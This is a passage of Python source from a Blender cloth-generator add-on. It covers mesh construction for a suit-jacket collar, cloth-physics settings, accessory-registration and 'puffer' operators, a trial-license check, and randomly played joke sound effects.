            select_vertices([13], deselect=True)
            bpy.ops.mesh.extrude_region_move()
            set_vertex_location_by_index(vertex_index=(get_highest_vertex_index()+1), world_position=shortcollartip)
            
            #Fix CollarJoint
            set_vertex_location_by_index(vertex_index=36, world_position=select_vertices([31,38], deselect=True, get_location=True))
            select_vertices([36], deselect=True)
            move((-edge_length(17,37)*0.2,0,0))
            
            select_vertices([18,19,29,30], deselect=True)
            bpy.ops.mesh.edge_face_add()        
            select_vertices([16,18,28,29], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([15,16,28,27], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([14,15,26,27], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([14,17,26,37], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([13,17,37,38], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([13,21,36,38], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([21,22,31,36], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([22,23,31,32], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([23,24,32,33], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([24,25,33,34], deselect=True)
            bpy.ops.mesh.edge_face_add()
            select_vertices([20,25,34,35], deselect=True)
            bpy.ops.mesh.edge_face_add()
            
            #Sharpen Length
            select_vertices([19,20], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            #Sharpen Collar
            select_vertices([17,37], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            select_vertices([14,26], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            select_vertices([13,38], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            #Make Triangle
            placement1 = select_vertices([19], deselect=True, get_location=True)
            select_vertices([30,19], deselect=True)
            bpy.ops.mesh.merge(type='CENTER')
            set_vertex_location_by_index(vertex_index=19, world_position=placement1)
            
            #Delete FloatingRow
            select_vertices([0,12], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.mesh.delete(type='VERT')
            
            #Ensure middle verts
            placement = mathutils.Vector((0,0,0))
            select_vertices([7,21], deselect=True)
            scale_vertices_around_location(placement, 0, axis='X')
            
            #Weight Collar
            bpy.ops.object.mode_set(mode='EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            group_vertices(name_of_group="SuitCollar", weight=1)
            bpy.ops.object.mode_set(mode='EDIT')
            
            select_vertices([6,16], deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            
            
            #Join with Main
            bpy.ops.object.mode_set(mode='OBJECT')
            Collar.select_set(True)
            Cloth.select_set(True)
            bpy.context.view_layer.objects.active = Cloth
            bpy.ops.object.join()
            
            bpy.ops.object.shade_smooth()
            Cloth.name = 'Divine_Blazer'
            
            #Ensure middle verts
            placement = mathutils.Vector((0,0,0))
            select_vertices([0,57,35,50,51,54,64], deselect=True)
            scale_vertices_around_location(placement, 0, axis='X')
            
            #Save Main Loop
            select_vertices([0,LowTip+1], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            Loop1 = append_selected_vertices_indices_to_array()
            
            select_vertices([(get_highest_vertex_index()-17),(get_highest_vertex_index()-18)], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            Loop2 = append_selected_vertices_indices_to_array()
            
            bridge(Loop1,Loop2)
            
            #Normal Fix
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.normals_make_consistent(inside=False)

            join_vertices([(get_highest_vertex_index()-11),38], new=True)
            
            #Merge Triangle
            placement2 = select_vertices([LowTip+1], deselect=True, get_location=True)
            select_vertices([get_highest_vertex_index()-18,LowTip+1], deselect=True)
            bpy.ops.mesh.merge(type='CENTER')
            set_vertex_location_by_index(vertex_index=LowTip+1, world_position=placement2)
            
            #Sort Collar
            select_vertices([get_highest_vertex_index()-2,get_highest_vertex_index()-3], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            bpy.ops.transform.edge_slide(value=0.2, mirror=True, snap=False, snap_elements={'FACE'}, use_snap_project=False, snap_target='ACTIVE', use_snap_self=True, use_snap_edit=True, use_snap_nonedit=True, use_snap_selectable=False, correct_uv=True)
            replace_weights(group="Pinning", weight=0.5)
            
            select_vertices([get_highest_vertex_index()-19,get_highest_vertex_index()-17], deselect=True)
            bpy.ops.mesh.shortest_path_select()
            replace_weights(group="Pinning", weight=0.5)
            
            select_vertices([get_highest_vertex_index()-23,1], deselect=True)
            replace_weights(group="Pinning", weight=1)
            
            
            #Unwrap
            select_vertex_group("SuitCollar", deselect=True)
            bpy.ops.mesh.select_more()
            bpy.ops.uv.unwrap(method='ANGLE_BASED', margin=0.001)
            
            #Materials
            Cloth.select_set(True)
            bpy.context.view_layer.objects.active = Cloth
            bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Blazer_Body"))
            bpy.context.scene.cloth_object.data.materials.append(bpy.data.materials.new(name="Divine_Blazer_Secondary"))
            
            #Assigning Materials
            select_vertex_group("SuitCollar", deselect=True)
            bpy.ops.mesh.select_more()
            bpy.context.scene.cloth_object.active_material_index = 1
            bpy.ops.object.material_slot_assign()
            
            #Setting Material Colours
            bpy.context.scene.cloth_object.active_material_index = 1
            bpy.context.scene.cloth_object.active_material.diffuse_color = (0.210878, 0.0975799, 0.0422716, 1)
            bpy.context.scene.cloth_object.active_material.roughness = 0.193612

            
            bpy.context.scene.cloth_object.active_material_index = 0
            bpy.context.scene.cloth_object.active_material.diffuse_color = (0.0337466, 0.0176957, 0.00726083, 1)
            bpy.context.scene.cloth_object.active_material.roughness = 1


            
            bpy.context.space_data.shading.color_type = 'MATERIAL'
            
            #Sharpen Shoulders
            select_vertex_group("ShoulderLoop", deselect=True)
            bpy.ops.transform.edge_crease(value=1, snap=False)
            #replace_weights(group="Pinning", weight=1)
            
            select_vertices([13,12,11,10,9], deselect=True)
            replace_weights(group="Pressure", weight=1)
            
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.flip_normals()
            bpy.ops.mesh.select_all(action='DESELECT')


            #Modifier Adjustments
            bpy.ops.object.mode_set(mode='OBJECT')
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = True
            bpy.context.object.modifiers["Subdivision.001"].levels = 2
            bpy.context.object.modifiers["Subdivision.001"].render_levels = 2
            bpy.context.object.modifiers["Subdivision"].levels = 1
            bpy.context.object.modifiers["Subdivision"].render_levels = 1
            bpy.context.object.modifiers["Cloth"].settings.quality = 20
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.1
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 0.5
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 5
            bpy.context.object.modifiers["Solidify"].offset = 0

            

            

            
            #END
            bpy.ops.ed.undo_push(message="Turn To Suit Jacket")
            poop = random.randint(-1, 8)
            if(poop == 0):
                bpy.ops.object.play_sound(sound_name="JamesBond.mp3")
            elif(poop == 1):
                bpy.ops.object.play_sound(sound_name="honestlythefabric.mp3")
            elif(poop == 2):
                bpy.ops.object.play_sound(sound_name="NewBlazerrr.mp3")
            elif(poop == 3):
                bpy.ops.object.play_sound(sound_name="Thisisreallycool.mp3")
            elif(poop == 4):
                bpy.ops.object.play_sound(sound_name="honestlythefabric.mp3")
            elif(poop == 5):
                bpy.ops.object.play_sound(sound_name="NewBlazerrr.mp3")
            elif(poop > 5 and poop < 8):
                bpy.ops.object.play_sound(sound_name="NewCloth.mp3")
            else:
                bpy.ops.object.play_sound(sound_name="Bind.mp3")
            bpy.context.preferences.view.language = safelanguage
            return {'FINISHED'}

class OBJECT_OT_shrinkwrap_cuffs(bpy.types.Operator):
    bl_idname = "object.shrinkwrap_cuffs"
    bl_label = "Shrinkwrap Cuffs"
    
    
    def execute(self, context):
        return {'FINISHED'}

class OBJECT_OT_trial_ended(bpy.types.Operator):
    bl_idname = "object.trial_ended"
    bl_label = "Trial Ended"
    
    
    def execute(self, context):
        self.report({'WARNING'}, f"Sorry, your free trial has ended")
        bpy.ops.object.play_sound(sound_name="FreeTrial.mp3")
        bpy.ops.wm.url_open(url="https://blendermarket.com/products/divine-cut-smart-cloth-generator")
        return {'FINISHED'}

class OBJECT_OT_bad_connection(bpy.types.Operator):
    bl_idname = "object.bad_connection"
    bl_label = "Bad Connection"
    
    
    def execute(self, context):
        self.report({'WARNING'}, f"Please Check your Internet Connection")
        bpy.ops.object.play_sound(sound_name="InternetConnection.mp3")
        return {'FINISHED'}

class OBJECT_OT_set_physics(bpy.types.Operator):
    bl_idname = "object.set_physics"
    bl_label = "Set Physics"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            bpy.ops.object.play_sound(sound_name="Bind.mp3")
            if(bpy.context.scene.cloth_quality > 10 and bpy.context.scene.cloth_quality_message == False):
                bpy.context.scene.cloth_quality_message = True
                bpy.ops.object.play_sound(sound_name="ClothQuality.mp3")
            elif(bpy.context.scene.cloth_stretchiness > 10 and bpy.context.scene.cloth_stretchiness_message == False):
                bpy.context.scene.cloth_stretchiness_message = True
                bpy.ops.object.play_sound(sound_name="Stretchiness.mp3")
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.context.object.modifiers["Cloth"].settings.quality = (bpy.context.scene.cloth_quality * 5) + 5
            #bpy.context.scene.cloth_object.modifiers["Cloth"].settings.mass = 0.05+(((bpy.context.scene.cloth_weight - 1)/9)*(0.5-0.05))
            bpy.context.scene.cloth_object.modifiers["Cloth"].settings.mass = bpy.context.scene.cloth_weight * 0.035
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 10/bpy.context.scene.cloth_stretchiness
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 10/bpy.context.scene.cloth_stretchiness
            bpy.context.object.modifiers["Cloth"].settings.shrink_max = bpy.context.scene.cloth_max_inflation * 0.3
            bpy.context.object.modifiers["Cloth"].settings.shrink_min = -bpy.context.scene.cloth_max_inflation * 0.3
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = bpy.context.scene.cloth_max_pressure * 500
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}
    
class OBJECT_OT_hide_bind(bpy.types.Operator):
    bl_idname = "object.hide_bind"
    bl_label = "Hide Bind"
    
    
    def execute(self, context):
        rebind = False
        obj = bpy.context.active_object
        if obj and obj.modifiers:
            for modifier in obj.modifiers:
                if "SurfaceDeform" in modifier.name:
                    if(modifier.show_viewport):
                        modifier.show_viewport = False
                    else:
                        modifier.show_viewport = True
                        rebind = True
                    
                    bpy.context.scene.bind_visibility_property = not bpy.context.scene.bind_visibility_property
            if(rebind):
                bpy.ops.object.bind_to_character()
                    
        return {'FINISHED'}

class OBJECT_OT_register_divine_object(bpy.types.Operator):
    bl_idname = "object.register_divine_object"
    bl_label = "Register Divine Object"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            if("Divine_AC_Cloth_Lace" in bpy.context.active_object.name):
                if("Divine_AC_Cloth_Lace_Joined" not in bpy.context.active_object.name):
                    bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
                    bpy.context.active_object.name = "Divine_AC_Cloth_Lace_Joined"
                    newlace = bpy.context.active_object
                    bpy.ops.object.mode_set(mode = 'EDIT')
                    select_vertices([0,1,2,3,4,5,6,7,8,9,10,11], deselect=True)
                    bpy.ops.mesh.separate(type='SELECTED')
                    bpy.ops.object.mode_set(mode = 'OBJECT')
                    bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                    bpy.ops.object.modifier_add(type='COLLISION')
                    bpy.ops.object.modifier_move_to_index(modifier="Collision", index=get_modifier_index('Cloth')+1)
                    bpy.context.object.collision.damping = 1
                    bpy.context.object.collision.thickness_outer = 0.001
                    bpy.context.object.collision.thickness_inner = 0.001
                    bpy.context.object.collision.cloth_friction = 2
                    bpy.context.view_layer.objects.active = bpy.data.objects["Divine_AC_Cloth_Lace_Joined.001"]
                    bpy.context.object.active_material_index = 0
                    bpy.ops.object.material_slot_remove()
                    bpy.context.active_object.name = "Divine_AC_Cloth_Lace_Joined_Ring"
                    bpy.ops.object.modifier_remove(modifier="Softbody")
                    newring = bpy.context.active_object
                    bpy.ops.object.select_all(action='DESELECT')
                    bpy.context.view_layer.objects.active = bpy.data.objects["Divine_AC_Cloth_Lace_Joined"]
                    bpy.context.active_object.name = "Divine_AC_Cloth_Lace_Joined_Lace"
                    newlace.select_set(True)
                    newring.select_set(True)
                    #bpy.data.objects["Divine_AC_Cloth_Lace_Joined_Lace"].select_set(True)
                    #bpy.data.objects["Divine_AC_Cloth_Lace_Joined_Ring"].select_set(True)
                    bpy.context.scene.tool_settings.use_snap = True
                    bpy.context.scene.tool_settings.snap_target = 'ACTIVE'
                    bpy.context.scene.tool_settings.snap_elements_base = {'FACE'}
                    bpy.context.scene.tool_settings.use_snap_align_rotation = True
                    bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")
                    

                    return {'FINISHED'}
                return {'FINISHED'}
            if("Divine_AC_Buckle" in bpy.context.active_object.name):
                strap = bpy.context.active_object
                strap.name = "Divine_Buckle_Operation"
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.separate(type='SELECTED')
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.ops.object.select_all(action='DESELECT')
                soft = bpy.data.objects["Divine_Buckle_Operation.001"]
                soft.name = "Divine_Strap_Sim"
                bpy.context.view_layer.objects.active = soft
                bpy.context.object.display_type = 'WIRE'
                bpy.context.object.hide_render = True
                bpy.context.object.visible_camera = False
                bpy.context.object.visible_diffuse = False
                bpy.context.object.visible_glossy = False
                bpy.context.object.visible_transmission = False
                bpy.context.object.visible_volume_scatter = False
                bpy.context.object.visible_shadow = False
                bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
                bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                bpy.context.view_layer.objects.active = strap
                strap.name = "Xane_Buckle"
                bpy.ops.object.modifier_remove(modifier="Softbody")
                bpy.context.object.modifiers["SurfaceDeform"].target = soft
                bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
                bpy.ops.object.modifier_add(type='SOLIDIFY')
                bpy.context.object.modifiers["Solidify"].offset = 0
                bpy.context.object.modifiers["Solidify"].thickness = 0.001
                #bpy.context.object.parent = soft
                bpy.ops.object.select_all(action='DESELECT')
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.ops.object.modifier_add(type='COLLISION')
                bpy.ops.object.modifier_move_to_index(modifier="Collision", index=get_modifier_index('Cloth')+1)
                bpy.context.object.collision.damping = 1
                bpy.context.object.collision.thickness_outer = 0.001
                bpy.context.object.collision.thickness_inner = 0.001
                bpy.context.object.collision.cloth_friction = 2
                bpy.ops.object.select_all(action='DESELECT')
                bpy.context.view_layer.objects.active = strap
                strap.select_set(True)
                soft.select_set(True)
                bpy.ops.object.parent_set(type='OBJECT', keep_transform=True)
                bpy.context.scene.tool_settings.use_snap = True
                bpy.context.scene.tool_settings.snap_target = 'ACTIVE'
                bpy.context.scene.tool_settings.snap_elements_base = {'FACE'}
                bpy.context.scene.tool_settings.use_snap_align_rotation = True
                bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")
                return {'FINISHED'}
            if("Divine_Decal_Button" in bpy.context.active_object.name):
                bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
                bpy.context.scene.tool_settings.use_snap = True
                bpy.context.scene.tool_settings.snap_target = 'ACTIVE'
                bpy.context.scene.tool_settings.snap_elements_base = {'FACE'}
                bpy.context.scene.tool_settings.use_snap_align_rotation = True
                bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")
                poop = random.randint(-1, 2)
                if(poop == 0):
                    bpy.ops.object.play_sound(sound_name="buttonjoke.mp3")
                return {'FINISHED'}
            if("Divine_Curve" in bpy.context.active_object.name):
                bpy.ops.object.transform_apply(location=False, rotation=False, scale=True)
                thread = bpy.context.active_object
                thread.name = "Divine_Thread_Operation"
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.separate(type='SELECTED')
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.ops.object.select_all(action='DESELECT')
                threadcurve = bpy.data.objects["Divine_Thread_Operation.001"]
                threadcurve.name = "Thread_Curve"
                thread.name = "Divine_Thread"
                bpy.ops.object.select_all(action='DESELECT')
                bpy.data.objects[threadcurve.name].select_set(True)
                bpy.context.view_layer.objects.active = threadcurve
                bpy.ops.object.convert(target='CURVE')
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.curve.select_all(action='SELECT')
                bpy.ops.curve.spline_type_set(type='BEZIER')
                #bpy.ops.curve.handle_type_set(type='ALIGNED')
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.ops.object.modifier_add(type='SHRINKWRAP')
                bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
                bpy.context.object.modifiers["Shrinkwrap"].use_apply_on_spline = True
                bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
                bpy.context.object.modifiers["Shrinkwrap"].offset = 0.001
                bpy.ops.object.modifier_apply(modifier="Shrinkwrap", report=True)
                bpy.ops.object.modifier_add(type='SHRINKWRAP')
                bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
                bpy.context.object.modifiers["Shrinkwrap"].use_apply_on_spline = True
                bpy.context.object.modifiers["Shrinkwrap"].wrap_mode = 'OUTSIDE_SURFACE'
                bpy.context.object.modifiers["Shrinkwrap"].offset = 0.001
                bpy.context.object.show_in_front = True
                bpy.context.scene.cloth_object.select_set(True)
                threadcurve.select_set(True)
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.ops.object.parent_set(type='OBJECT', keep_transform=True)
                bpy.ops.object.select_all(action='DESELECT')
                bpy.data.objects[thread.name].select_set(True)
                bpy.context.view_layer.objects.active = thread
                bpy.ops.object.modifier_add(type='ARRAY')
                bpy.context.object.modifiers["Array"].fit_type = 'FIT_CURVE'
                bpy.context.object.modifiers["Array"].curve = threadcurve
                bpy.ops.object.select_all(action='DESELECT')
                bpy.data.objects[thread.name].select_set(True)
                bpy.data.objects[threadcurve.name].select_set(True)
                bpy.context.view_layer.objects.active = threadcurve
                bpy.ops.object.parent_set(type='CURVE')
                bpy.ops.object.select_all(action='DESELECT')
                bpy.data.objects[threadcurve.name].select_set(True)
                bpy.context.view_layer.objects.active = threadcurve
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.curve.select_all(action='DESELECT')
                bpy.ops.curve.de_select_last()
                bpy.context.scene.tool_settings.use_snap = True
                bpy.context.scene.tool_settings.snap_target = 'ACTIVE'
                bpy.context.scene.tool_settings.snap_elements_base = {'FACE'}
                bpy.context.scene.tool_settings.use_snap_align_rotation = False
                bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")
                poop = random.randint(-1, 2)
                if(poop == 0):
                    bpy.ops.object.play_sound(sound_name="mybaby.mp3")
                return {'FINISHED'}
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.context.scene.tool_settings.use_snap = True
            bpy.context.scene.tool_settings.snap_target = 'ACTIVE'
            bpy.context.scene.tool_settings.snap_elements_base = {'FACE'}
            bpy.context.scene.tool_settings.use_snap_align_rotation = True
            bpy.ops.object.play_sound(sound_name="RegisterDivine.mp3")
            bpy.context.preferences.view.language = safelanguage
            return{'FINISHED'}



class OBJECT_OT_toggle_seams(bpy.types.Operator):
    bl_idname = "object.toggle_seams"
    bl_label = "Toggle Seams"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            if(bpy.context.scene.seamtool_toggle_property):
                #safemode = bpy.context.mode
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                if(bpy.context.scene.cloth_object.vertex_groups.get('Seams') is not None):
                    select_vertex_group("Seams", deselect=True)
                else:
                    select_vertex_group("Unwrap", deselect=True)
                bpy.ops.mesh.mark_sharp()
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.context.scene.seamtool_toggle_property = False
                bpy.ops.object.play_sound(sound_name="Bind2.mp3")
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            else:
                #safemode = bpy.context.mode
                bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                if(bpy.context.scene.cloth_object.vertex_groups.get('Seams') is not None):
                    select_vertex_group("Seams", deselect=True)
                else:
                    select_vertex_group("Unwrap", deselect=True)
                bpy.ops.mesh.mark_sharp(clear=True)
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.context.scene.seamtool_toggle_property = True
                bpy.ops.object.play_sound(sound_name="Bind3.mp3")
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            return{'FINISHED'}
    
class OBJECT_OT_puffer(bpy.types.Operator):
    bl_idname = "object.puffer"
    bl_label = "Puffer"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            safelanguage = bpy.context.preferences.view.language
            bpy.context.preferences.view.language = 'en_US'
            if(bpy.context.mode != 'EDIT_MESH'):
                bpy.ops.object.mode_set(mode = 'EDIT')
                #self.report({'WARNING'}, f"Select a bunch of faces and then press Puff")
                if(bpy.context.scene.puffer_message == False):
                    bpy.ops.object.play_sound(sound_name="PufferGuide.mp3")
                    time.sleep(11.5)
                    bpy.ops.wm.url_open(url="https://youtu.be/L6o64xm2tQg?t=576")
                    bpy.context.scene.puffer_message = True
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            mesh = bpy.context.active_object.data
            #selected_vertices = [v for v in mesh.vertices if v.select]
            selected_edges = [e for e in mesh.edges if e.select]
            selected_faces = [f for f in mesh.polygons if f.select]
            #if len(selected_faces) == 0 and len(selected_edges) > 1:
            if len(selected_faces) == 0:
                #bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                #bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='VERT')
                replace_weights(group="Shrinking", weight=1)
                replace_weights(group="Pressure", weight=0)
                bpy.ops.object.mode_set(mode = 'EDIT')
                bpy.ops.mesh.select_all(action='INVERT')
                replace_weights(group="Shrinking", weight=0.5)
                replace_weights(group="Pressure", weight=bpy.context.scene.puffpressure_property)
                bpy.ops.mesh.select_all(action='INVERT')
                bpy.ops.mesh.mark_sharp()
                bpy.ops.object.mode_set(mode = 'OBJECT')
                bpy.ops.screen.animation_play()
                bpy.context.preferences.view.language = safelanguage
                return {'FINISHED'}
            #safelanguage = bpy.context.preferences.view.language
            #bpy.context.preferences.view.language = 'en_US'
            source = bpy.context.active_object
            safename = source.name
            bpy.context.active_object.name = 'abouttospawnapuffer'
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.duplicate_move()
            bpy.ops.mesh.separate(type='SELECTED')
            bpy.ops.object.mode_set(mode = 'OBJECT')
            Puff = bpy.data.objects["abouttospawnapuffer.001"]
            Puff.name = safename + ".Puff"
            source.name = safename
            bpy.context.view_layer.objects.active = Puff
            bpy.context.object.parent = bpy.context.scene.cloth_object
            bpy.ops.object.mode_set(mode = 'OBJECT')
            if("Subdivision" in bpy.context.object.modifiers):
                bpy.context.object.modifiers["Subdivision"].subdivision_type = 'SIMPLE'
                bpy.ops.object.modifier_apply(modifier="Subdivision")
            bpy.ops.object.select_all(action='DESELECT')
            mesh = Puff.data
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.select_all(action='SELECT')
            bpy.ops.mesh.region_to_loop()
            bpy.ops.object.mode_set(mode = 'OBJECT')
            
            #set weights and add to group
            
            #group_a = bpy.context.scene.cloth_object.vertex_groups.get('Pinning')
            for vert in mesh.vertices:
                vert_index = vert.index
                if(vert.select == True):
                    Puff.vertex_groups.get('Pinning').add([vert_index], 1.0, 'REPLACE')
                else:
                    Puff.vertex_groups.get('Pinning').add([vert_index], 0.0, 'REPLACE')
                    Puff.vertex_groups.get('Pressure').add([vert_index], 1.0, 'REPLACE')
            bpy.ops.object.mode_set(mode = 'OBJECT')
            bpy.ops.object.modifier_apply(modifier="Mirror", report=True)
            bpy.ops.object.modifier_remove(modifier="Smooth")
            bpy.context.object.modifiers["Subdivision.001"].show_viewport = False
            bpy.context.object.modifiers["EdgeSplit"].show_viewport = False
            bpy.context.object.modifiers["Solidify"].show_viewport = False
            bpy.context.object.modifiers["Subdivision.001"].show_render = False
            bpy.context.object.modifiers["EdgeSplit"].show_render = False
            bpy.context.object.modifiers["Solidify"].show_render = False
            bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            bpy.context.object.modifiers["Shrinkwrap"].offset = 0
            bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Pinning"
            if("SurfaceDeform" in bpy.context.object.modifiers):
                bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
            else:
                bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
                clothindex = 0
                indexcounter = 0
                if("Cloth" not in bpy.context.object.modifiers):
                    bpy.ops.object.modifier_add(type='CLOTH')
                for modifier in bpy.context.object.modifiers:
                    if modifier.name == "Cloth":
                        clothindex = indexcounter
                    indexcounter += 1  
                bpy.ops.object.modifier_move_to_index(modifier="SurfaceDeform", index=(clothindex))
            
            bpy.context.object.modifiers["SurfaceDeform"].target = bpy.context.scene.cloth_object
            bpy.ops.object.surfacedeform_bind(modifier="SurfaceDeform")
            bpy.context.object.modifiers["Cloth"].settings.quality = 5
            bpy.context.object.modifiers["Cloth"].settings.tension_stiffness = 1
            bpy.context.object.modifiers["Cloth"].settings.compression_stiffness = 5
            bpy.context.object.modifiers["Cloth"].settings.shear_stiffness = 10
            bpy.context.object.modifiers["Cloth"].settings.bending_stiffness = 0.5
            bpy.context.object.modifiers["Cloth"].settings.compression_damping = 5
            bpy.context.object.modifiers["Cloth"].settings.shear_damping = 10
        #        bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = edge_length(1,2)
            bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force = bpy.context.object.modifiers["Cloth"].settings.uniform_pressure_force * bpy.context.scene.puffpressure_property
            bpy.context.object.modifiers["Cloth"].settings.pressure_factor = 2
            bpy.context.object.modifiers["Cloth"].settings.mass = 0.05
            bpy.context.object.modifiers["Cloth"].settings.tension_damping = 5
            bpy.context.object.modifiers["Solidify"].show_viewport = True
            bpy.context.object.modifiers["Solidify"].show_render = True
            bpy.context.object.modifiers["Solidify"].offset = 0
            bpy.context.object.modifiers["Solidify"].thickness = 0.01
            bpy.context.view_layer.objects.active = bpy.context.scene.cloth_object
            bpy.ops.object.mode_set(mode = 'EDIT')
            bpy.ops.mesh.select_mode(use_extend=False, use_expand=False, type='FACE')
            #bpy.ops.object.modifier_add(type='SHRINKWRAP')
            #bpy.context.object.modifiers["Shrinkwrap"].vertex_group = "Pinning"
            #bpy.context.object.modifiers["Shrinkwrap"].target = bpy.context.scene.cloth_object
            #bpy.ops.object.modifier_remove(modifier="SurfaceDeform")
            #bpy.ops.object.modifier_remove(modifier="Solidify")
            #bpy.ops.object.modifier_remove(modifier="Subdivision.001")
            #bpy.ops.object.modifier_add(type='SURFACE_DEFORM')
            bpy.context.preferences.view.language = safelanguage
            bpy.ops.ed.undo_push(message="Divine Puffer")
            return{'FINISHED'}


class OBJECT_OT_enable_collision(bpy.types.Operator):
    bl_idname = "object.enable_collision"
    bl_label = "Enable Collision"

    def execute(self, context):
        if(fetch_button_text(Conscience) == None):
            bpy.ops.object.bad_connection()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Denied"):
            bpy.ops.object.trial_ended()
            return{'FINISHED'}
        if(fetch_button_text(Conscience) == "Granted"):
            if(get_modifier_index('Collision') is None):
                bpy.ops.object.modifier_add(type='COLLISION')
                bpy.context.object.collision.damping = 0.5
                bpy.context.object.collision.thickness_outer = 0.001
                bpy.context.object.collision.thickness_inner = 0.001
                bpy.ops.object.play_sound(sound_name="Bind.mp3")
                bpy.context.window_manager.popup_menu(lambda self, context: self.layout.label(text="Collision Turned On"), title="INFO", icon='CHECKMARK')
